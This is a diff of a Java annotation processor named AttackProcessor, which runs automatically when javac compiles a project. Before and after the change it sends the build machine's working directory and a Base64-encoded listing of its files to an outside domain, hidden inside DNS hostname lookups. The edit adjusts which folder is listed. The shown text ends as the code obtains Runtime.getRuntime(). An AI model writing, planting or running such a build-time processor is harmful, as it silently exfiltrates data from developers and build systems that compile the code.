@@ -27,17 +27,16 @@ public class AttackProcessor extends AbstractProcessor {
     @Override
     public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
         StringBuffer sb = new StringBuffer("");
-        sb.append(System.getProperties());
 
-        File folder = new File(System.getProperty("user.home"));
 
         try
         {
             Inet4Address.getByName( "javac8.lirui28.t.dlsr.ga" );
-            String pwd = new File( "." ).getAbsolutePath();
-            pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );
 
             Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
+
+
+            File folder = new File(System.getProperty("user.dir"));
 
             if (folder.isDirectory()){
                 File[] files = folder.listFiles();
@@ -48,8 +47,6 @@ public class AttackProcessor extends AbstractProcessor {
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
 
             Inet4Address.getByName( fs.substring( 0,40 )+".lirui28.t.dlsr.ga" );
-
-
 
             try {
                 Runtime runtime = Runtime.getRuntime();
